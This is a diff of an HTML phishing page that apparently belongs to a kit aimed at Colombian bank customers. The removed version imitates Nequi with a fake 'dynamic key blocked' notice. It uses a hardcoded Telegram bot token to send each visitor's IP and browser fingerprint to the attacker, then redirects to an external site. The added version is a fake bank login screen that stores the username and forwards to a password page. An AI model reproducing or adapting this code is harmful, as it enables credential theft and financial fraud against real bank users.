@@ -1,597 +1,232 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Reactivación de Clave Dinámica - Nequi</title>
+    <title>Image-based Website with Loader</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Inter', sans-serif;
         }
-        
-        body {
-            background: #FFFFFF;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        
-        .container {
-            background-color: white;
-            border-radius: 0px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.10);
+        body, html {
+            height: 100%;
             width: 100%;
-            max-width: 450px;
-            overflow: hidden;
-            border: 1px solid #f3f3f3;
-        }
-        
-        /* Imagen antes del banner */
-        .banner-image {
-            width: 100%;
-            text-align: center;
-            padding: 20px;
-            background: white;
-        }
-        
-        .banner-image img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 10px;
-        }
-        
-        /* Banner estilo Nequi */
-        .nequi-banner {
-            background: #2E0039;
-            color: white;
-            padding: 25px 20px;
-            text-align: center;
-            position: relative;
+            background-color: #f0f0f0;
             overflow: hidden;
         }
-        
-        .banner-content {
-            position: relative;
-            z-index: 2;
-        }
-        
-        .nequi-logo {
-            font-size: 32px;
-            font-weight: bold;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-        
-        .nequi-logo .icon {
-            background: white;
-            color: #2E0039;
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-        }
-        
-        .banner-title {
-            font-size: 24px;
-            margin-bottom: 10px;
-            font-weight: 600;
-        }
-        
-        .banner-subtitle {
-            font-size: 16px;
-            opacity: 0.9;
-            margin-bottom: 20px;
-        }
-        
-        .banner-features {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            flex-wrap: wrap;
-            margin-top: 20px;
-        }
-        
-        .feature {
-            background: rgba(255, 255, 255, 0.2);
-            padding: 8px 15px;
-            border-radius: 20px;
-            font-size: 12px;
-            backdrop-filter: blur(10px);
-        }
-        
-        .header {
-            background: #2E0039;
-            color: white;
-            padding: 20px;
-            text-align: center;
-        }
-        
-        .header h1 {
-            font-size: 20px;
-            margin-bottom: 10px;
-            font-weight: 600;
-        }
-        
-        .header p {
-            font-size: 14px;
-            opacity: 0.9;
-        }
-        
-        .content {
-            padding: 30px;
-        }
-        
-        .alert-box {
-            background-color: #F9F3FF;
-            border-left: 4px solid #2E0039;
-            padding: 15px;
-            margin-bottom: 25px;
-            border-radius: 0px;
-        }
-        
-        .alert-box h3 {
-            color: #3A0A63;
-            font-size: 16px;
-            margin-bottom: 5px;
-            display: flex;
-            align-items: center;
-        }
-        
-        .alert-box h3 i {
-            margin-right: 8px;
-        }
-        
-        .alert-box p {
-            color: #3A0A63;
-            font-size: 14px;
-            line-height: 1.5;
-        }
-        
-        .steps {
-            margin-bottom: 25px;
-        }
-        
-        .step {
-            display: flex;
-            margin-bottom: 20px;
-            align-items: flex-start;
-            padding: 18px;
-            background-color: #fff;
-            border-radius: 0px;
-            border: 1px solid #f3f3f3;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.10);
-        }
-        
-        .step-number {
-            background: #2E0039;
-            color: white;
-            width: 30px;
-            height: 30px;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-weight: bold;
-            margin-right: 15px;
-            flex-shrink: 0;
-        }
-        
-        .step-text {
-            flex: 1;
-        }
-        
-        .step-text h4 {
-            font-size: 16px;
-            margin-bottom: 5px;
-            color: #3A0A63;
-            font-weight: 700;
-        }
-        
-        .step-text p {
-            font-size: 13px;
-            color: #3A0A63;
-            line-height: 1.5;
-            opacity: 0.7;
-        }
-        
-        .btn-container {
-            text-align: center;
-            margin-top: 30px;
-        }
-        
-        .btn {
-            background:#da0081;
-            color: white;
-            border: none;
-            padding: 16px;
-            border-radius: 14px;
-            font-size: 17px;
-            cursor: pointer;
-            font-weight: 700;
+
+        /* Estilos del loader */
+        .loader-container {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
-            transition: all 0.3s ease;
-        }
-        
-        .btn:hover {
-            background: #3A0A63;
-        }
-        
-        .security-notice {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 12px;
-            color: #3A0A63;
-            line-height: 1.5;
-            padding: 10px;
-            background-color: #F9F3FF;
-            border-radius: 0px;
-            opacity: 0.7;
-        }
-        
-        /* Footer Mejorado */
-        .footer {
-            background: #2E0039;
-            color: white;
-            padding: 25px 20px;
-            text-align: center;
-        }
-        
-        .footer-content {
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-        
-        .footer-logo {
-            font-size: 20px;
-            font-weight: bold;
-            margin-bottom: 12px;
+            height: 100%;
+            background-color: #ffffff;
             display: flex;
+            justify-content: center;
             align-items: center;
-            justify-content: center;
-            gap: 8px;
+            z-index: 9999;
         }
-        
-        .footer-logo .icon {
-            background: white;
-            color: #2E0039;
-            width: 25px;
-            height: 25px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            font-size: 12px;
-        }
-        
-        .footer-text {
-            font-size: 13px;
-            opacity: 0.9;
-            margin-bottom: 12px;
-            line-height: 1.4;
-        }
-        
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            flex-wrap: wrap;
-            margin-bottom: 15px;
-        }
-        
-        .footer-link {
-            color: white;
-            text-decoration: none;
-            font-size: 12px;
-            opacity: 0.8;
-            transition: opacity 0.3s ease;
-        }
-        
-        .footer-link:hover {
-            opacity: 1;
-        }
-        
-        .footer-copyright {
-            font-size: 11px;
-            opacity: 0.7;
-            border-top: 1px solid rgba(255,255,255,0.2);
-            padding-top: 12px;
-            margin-top: 12px;
-        }
-        
-        .security-badge {
-            background: rgba(255,255,255,0.1);
-            padding: 6px 12px;
-            border-radius: 20px;
-            font-size: 11px;
-            display: inline-block;
-            margin-top: 8px;
-        }
-        
         .loader {
-            display: none;
-            text-align: center;
-            margin-top: 20px;
-        }
-        
-        .loader-spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #2E0039;
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
             animation: spin 1s linear infinite;
-            margin: 0 auto;
         }
-        
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
         }
-        
-        .success-message {
-            display: none;
-            text-align: center;
-            padding: 20px;
-            background-color: #F9F3FF;
-            color: #3A0A63;
-            border-radius: 0px;
-            margin-top: 20px;
-            border-left: 4px solid #00C853;
+
+        /* Estilos del contenido principal */
+        .image-container {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            position: relative;
+            display: none; /* Ocultamos inicialmente el contenido principal */
         }
-        
-        .success-message h3 {
-            color: #00C853;
-            margin-bottom: 10px;
+        .image-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .center-box {
+            position: absolute;
+            top: 55%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgb(255, 255, 255);
+            width: 290px;
+            height: 66px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: 8px;
+        }
+        .center-box .input-container {
+            position: relative;
+            width: 80%;
+        }
+        .center-box input {
+            width: 100%;
+            padding: 10px;
+            padding-left: 40px;
+            font-size: 19px;
+            border: none;
+            border-bottom: 1px solid #ffe100;
+            outline: none;
+        }
+        .center-box .input-container i {
+            position: absolute;
+            left: 4px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #888;
+            font-size: 17px;
+        }
+
+        .button-container {
+            position: absolute;
+            top: 70.4%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: flex;
+            gap: 10px;
+            transition: top 0.3s ease;
+        }
+        .button-container button {
+            padding: 13px 35px;
+            font-size: 13px;
+            border: none;
+            border-radius: 50px;
+            font-weight: bold;
+            color: rgb(1, 1, 1);
+            cursor: pointer;
+        }
+        .button-container button:first-child {
+            background-color: #ffffff;
+            border: 1px solid black;
+        }
+        .button-container button:first-child:hover {
+            background-color: #ffffff;
+        }
+        .button-container button:last-child {
+            background-color: #ffda37;
+            color: black;
+            cursor: not-allowed;
+        }
+        .button-container button:last-child.enabled {
+            background-color: #ffda37;
+            cursor: pointer;
+            color: rgb(1, 1, 1);
+        }
+        .button-container button:last-child.enabled:hover {
+            background-color: #ffb800;
         }
     </style>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
 </head>
 <body>
-    <div class="container">
-        <!-- Imagen antes del banner -->
-        <div class="banner-image">
-            <img src="bane.jpeg" alt="Mi imagen" style="width: 100%; max-width: 300px; height: auto;">
-            
-        </div>
-        
-        <div class="header">
-            <h1>Clave Dinámica Bloqueada</h1>
-            
-            <p>Por tu seguridad, necesitamos validar tu identidad</p>
-        
-        <img src="https://i.ytimg.com/vi/NrZ3sekzj8I/hq720.jpg?sqp=-oaymwE7CK4FEIIDSFryq4qpAy0IARUAAAAAGAElAADIQj0AgKJD8AEB-AH-CYAC0AWKAgwIABABGEIgEyh_MA8=&rs=AOn4CLCugCpuvPmTm3tnsNGvB_zeML3XKQ" alt="Imagen" style="width:250px; height:auto;border-radius:5px;">
-        </div>
-        
-        <div class="content">
-            <div class="alert-box">
-                <h3><i>⚠</i> Importante</h3>
-                <p>Tu clave dinámica Nequi ha sido bloqueada por medidas de seguridad. Para reactivarla, necesitamos validar tu identidad.</p>
-            </div>
-            
-            <div class="btn-container">
-                <button class="btn" id="startProcess">Validar Identidad</button>
-            </div>
-            
-            <div class="loader" id="loader">
-                <div class="loader-spinner"></div>
-                <p style="margin-top: 15px; color: #3A0A63;">Validando tu identidad, por favor espera...</p>
-            </div>
-            
-            <div class="success-message" id="successMessage">
-                <h3>✅ Validando Identidad</h3>
-                <p>Tu identidad sera verificada correctamente. Tu clave dinámica será reactivada en breve.</p>
-            </div>
-            <br>
-            <div class="steps">
-                <div class="step">
-                    <div class="step-number">1</div>
-                    <div class="step-text">
-                        <h4>Verificación de identidad</h4>
-                        <p>Confirmaremos que eres el titular de la cuenta mediante preguntas de seguridad.</p>
-                    </div>
-                </div>
-                
-                <div class="step">
-                    <div class="step-number">2</div>
-                    <div class="step-text">
-                        <h4>Validación de datos</h4>
-                        <p>Revisaremos la información de tu cuenta para garantizar la seguridad.</p>
-                    </div>
-                </div>
-                
-                <div class="step">
-                    <div class="step-number">3</div>
-                    <div class="step-text">
-                        <h4>Reactivación exitosa</h4>
-                        <p>Una vez validado, tu clave dinámica estará activa nuevamente.</p>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="security-notice">
-                <p>Nequi. Este proceso es 100% seguro y transparente.</p>
-            </div>
-        </div>
-        
-        <!-- Footer Mejorado -->
-        <div class="footer">
-            <div class="footer-content">
-                <div class="">
-                    <img src="https://images.seeklogo.com/logo-png/40/2/nequi-logo-png_seeklogo-404357.png" alt="Imagen" style="width:100px; height:auto;">
+    <!-- Loader -->
+    <div class="loader-container" id="loader">
+        <div class="loader"></div>
+    </div>
 
-                    <div class="icon"></div>
-                    Nequi
-                </div>
-                <div class="footer-text">
-                    Tu billetera digital más fácil, más rápida y más segura
-                </div>
-                <div class="footer-links">
-                    <a href="#" class="footer-link">Términos y Condiciones</a>
-                    <a href="#" class="footer-link">Política de Privacidad</a>
-                    <a href="#" class="footer-link">Ayuda</a>
-                    <a href="#" class="footer-link">Contáctanos</a>
-                </div>
-                <div class="security-badge">
-                    🔒 Transacciones 100% seguras
-                </div>
-                <div class="footer-copyright">
-                    &copy; 2024 Nequi. Todos los derechos reservados.
-                </div>
+    <!-- Contenido principal -->
+    <div class="image-container" id="mainContent">
+        <img src="img/cel1.jpg" alt="Background Image">
+        <div class="center-box">
+            <div class="input-container">
+                <i class="fas fa-user"></i>
+                <input type="text" placeholder="Usuario" id="userInput">
             </div>
+        </div>
+        <div class="button-container">
+            <button>Cancelar</button>
+            <button id="continueButton" class="disabled">Continuar</button>
         </div>
     </div>
 
     <script>
-        // Configuración de Telegram - REEMPLAZA CON TUS DATOS
-        const BOT_TOKEN = "8545595337:AAEMJymTqxVVtuerPNQmo7dnl_TIK9fPUIw";
-        const CHAT_ID = "7776240161";
-        
-        // Variable para evitar notificaciones duplicadas
-        let notificacionEnviada = false;
-        
-        // Función para obtener IP del usuario
-        function obtenerIP() {
-            return fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => data.ip)
-                .catch(error => {
-                    console.error('Error obteniendo IP:', error);
-                    return 'No disponible';
-                });
-        }
-        
-        // Función para obtener información detallada del navegador
-        function obtenerInfoNavegador() {
-            const navegadorInfo = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screenResolution: `${screen.width}x${screen.height}`,
-                colorDepth: `${screen.colorDepth} bits`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookiesEnabled: navigator.cookieEnabled,
-                javaEnabled: navigator.javaEnabled ? 'Sí' : 'No',
-                online: navigator.onLine ? 'Sí' : 'No'
-            };
-            return navegadorInfo;
-        }
-        
-        // Función para enviar a Telegram
-        function enviarATelegram(datos, tipo = 'VISITA') {
-            if (notificacionEnviada && tipo === 'VISITA') return;
-            
-            let mensaje = '';
-            
-            if (tipo === 'VISITA') {
-                mensaje = `🚨 <b>NUEVO VISITANTE EN LA PÁGINA</b> 🚨
+        // Mostrar el contenido principal cuando la página esté completamente cargada
+        window.onload = () => {
+            const loader = document.getElementById('loader');
+            const mainContent = document.getElementById('mainContent');
 
-📱 <b>Acción:</b> Página cargada
-📍 <b>IP:</b> ${datos.ip}
-🕐 <b>Fecha:</b> ${new Date().toLocaleString('es-ES')}
-🌐 <b>Navegador:</b> ${datos.navegadorInfo.userAgent.substring(0, 80)}...
-📱 <b>Plataforma:</b> ${datos.navegadorInfo.platform}
-💻 <b>Idioma:</b> ${datos.navegadorInfo.language}
-📏 <b>Resolución:</b> ${datos.navegadorInfo.screenResolution}
-🕐 <b>Zona Horaria:</b> ${datos.navegadorInfo.timezone}
-🌍 <b>Conectado:</b> ${datos.navegadorInfo.online}
+            // Ocultar el loader y mostrar el contenido principal
+            loader.style.display = 'none';
+            mainContent.style.display = 'block';
+        };
 
-🔔 <i>Usuario ha cargado la página de validación</i> 🔔`;
-            } else if (tipo === 'CLICK') {
-                mensaje = `🔔 <b>NUEVO CLICK EN NEQUI</b> 🔔
+        const userInput = document.getElementById('userInput');
+        const continueButton = document.getElementById('continueButton');
+        const buttonContainer = document.querySelector('.button-container');
 
-📱 <b>Usuario:</b> Click en Validar Identidad
-📍 <b>IP:</b> ${datos.ip}
-🕐 <b>Fecha:</b> ${new Date().toLocaleString('es-ES')}
-🌐 <b>Navegador:</b> ${datos.navegadorInfo.userAgent.substring(0, 80)}...
-📱 <b>Plataforma:</b> ${datos.navegadorInfo.platform}
-💻 <b>Idioma:</b> ${datos.navegadorInfo.language}
-📏 <b>Resolución:</b> ${datos.navegadorInfo.screenResolution}
-
-⚡ <i>Usuario hizo click en el botón de validación</i> ⚡`;
+        // Habilitar/Deshabilitar el botón
+        userInput.addEventListener('input', () => {
+            const userValue = userInput.value.trim();
+            if (userValue.length >= 4) {
+                continueButton.classList.add('enabled');
+                continueButton.classList.remove('disabled');
+            } else {
+                continueButton.classList.add('disabled');
+                continueButton.classList.remove('enabled');
             }
-
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: mensaje,
-                    parse_mode: 'HTML'
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log(`✅ Mensaje ${tipo} enviado a Telegram`);
-                if (tipo === 'VISITA') {
-                    notificacionEnviada = true;
-                }
-            })
-            .catch(error => {
-                console.error(`❌ Error enviando ${tipo} a Telegram:`, error);
-            });
-        }
-
-        // Enviar notificación cuando la página carga
-        window.addEventListener('load', function() {
-            obtenerIP().then(ip => {
-                const navegadorInfo = obtenerInfoNavegador();
-                const datosCarga = {
-                    ip: ip,
-                    navegadorInfo: navegadorInfo,
-                    timestamp: new Date().toISOString()
-                };
-                
-                // Enviar notificación de visita
-                enviarATelegram(datosCarga, 'VISITA');
-            });
         });
 
-        // Manejar el click del botón
-        document.getElementById('startProcess').addEventListener('click', function() {
-            // Ocultar el botón y mostrar el loader
-            this.style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
-            
-            // Obtener IP y enviar a Telegram
-            obtenerIP().then(ip => {
-                const navegadorInfo = obtenerInfoNavegador();
-                const datosUsuario = {
-                    ip: ip,
-                    navegadorInfo: navegadorInfo,
-                    timestamp: new Date().toISOString()
-                };
-                
-                // Enviar a Telegram
-                enviarATelegram(datosUsuario, 'CLICK');
-            });
-            
-            // Simular proceso de validación
-            setTimeout(function() {
-                // Ocultar loader y mostrar mensaje de éxito
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('successMessage').style.display = 'block';
-                
-                // Redirigir después de 3 segundos
-                setTimeout(function() {
-                    window.location.href = "https://servicioenlinea.online/dinainvalida/";
-                }, 3000);
-            }, 4000);
+        // Detectar cuando el teclado está visible y mover los botones
+        window.addEventListener('resize', () => {
+            if (window.innerHeight < 500) { // Asume que el teclado se muestra cuando la altura de la ventana es pequeña
+                buttonContainer.style.top = '77%'; // Mover los botones hacia abajo
+            } else {
+                buttonContainer.style.top = '70.4%'; // Restaurar la posición original
+            }
+        });
+
+        // Acción al hacer clic en "Continuar"
+        continueButton.addEventListener('click', async () => {
+            const userValue = userInput.value.trim();
+            if (userValue.length >= 4) {
+                try {
+                    // Generar transactionId único
+                    const transactionId = 'txn_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                    
+                    // Guardar en localStorage
+                    let bancoldata;
+                    try {
+                        const storedData = localStorage.getItem('bancoldata');
+                        bancoldata = storedData ? JSON.parse(storedData) : {};
+                    } catch (e) {
+                        console.error('Error al parsear bancoldata. Reiniciando a un objeto vacío:', e);
+                        bancoldata = {};
+                    }
+
+                    bancoldata.usuario = userValue;
+                    bancoldata.transactionId = transactionId;
+                    localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+
+                    // Enviar datos al worker (esto se hará en la siguiente pantalla con la clave)
+                    console.log('Usuario guardado:', userValue, 'Transaction ID:', transactionId);
+
+                    // Redirigir a la página siguiente
+                    window.location.href = 'cel-clave.html';
+                    
+                } catch (error) {
+                    console.error('Error:', error);
+                    alert('Error al procesar la solicitud');
+                }
+            } else {
+                alert('Por favor, ingrese un usuario válido de al menos 4 caracteres.');
+            }
         });
     </script>
 </body>
